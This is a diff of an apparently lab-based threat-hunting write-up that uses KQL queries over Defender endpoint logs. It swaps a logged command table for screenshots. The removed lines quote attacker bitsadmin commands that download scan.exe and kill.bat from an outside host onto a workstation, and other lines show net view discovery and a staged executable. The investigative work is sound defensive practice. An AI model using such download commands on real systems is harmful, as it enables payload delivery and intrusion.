@@ -558,6 +558,8 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("net view","\\")
 | project TimeGenerated, DeviceName, ProcessCommandLine, AccountName, FileName
 ```
+<img width="883" height="141" alt="Screenshot 2026-03-18 at 10 49 45" src="https://github.com/user-attachments/assets/05a77354-52eb-4bb5-b955-853d3a42b568" />
+
 
 > The `net view` results above (Section 7, Q26/Q27 table) confirm `as.srv.administrator` was the authenticated account on AS-SRV.
 
@@ -599,14 +601,9 @@ DeviceProcessEvents
 
 #### 📋 MDE Result — Full bitsadmin download chain (Q28)
 
-| TimeGenerated [UTC] | DeviceName | FileName | ProcessCommandLine |
-|---|---|---|---|
-| 1/27/2026, 8:14:03 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\Public\scan.exe` |
-| 1/27/2026, 8:14:51 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
-| 1/27/2026, 8:15:01 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
-| 1/27/2026, 8:15:06 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` |
-| 1/27/2026, 8:16:32 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` |
-| 1/27/2026, 8:50:35 PM | as-pc2 | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/kill.bat C:\ProgramData\kill.bat` |
+
+<img width="1240" height="297" alt="Screenshot 2026-03-18 at 10 51 53" src="https://github.com/user-attachments/assets/3337cfd6-a079-4f5e-8b97-2df37945b1b3" />
+
 
 ---
 
@@ -655,6 +652,12 @@ DeviceFileEvents
 | TimeGenerated [UTC] | DeviceName | FileName | InitiatingProcess | SHA256 |
 |---|---|---|---|---|
 | 1/27/2026, 10:24:08 PM | as-srv | **st.exe** | powershell.exe | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` |
+
+<img width="976" height="314" alt="Screenshot 2026-03-19 at 14 43 42" src="https://github.com/user-attachments/assets/2a0707cc-90e6-4f7d-9f44-b5cbe3190937" />
+
+<img width="1240" height="123" alt="Screenshot 2026-03-18 at 10 54 54" src="https://github.com/user-attachments/assets/08cb2838-d7bc-49a9-9290-aff3724c001f" />
+
+
 
 #### 📋 MDE Result — File events on AS-SRV showing full staging chain (Q32)
 
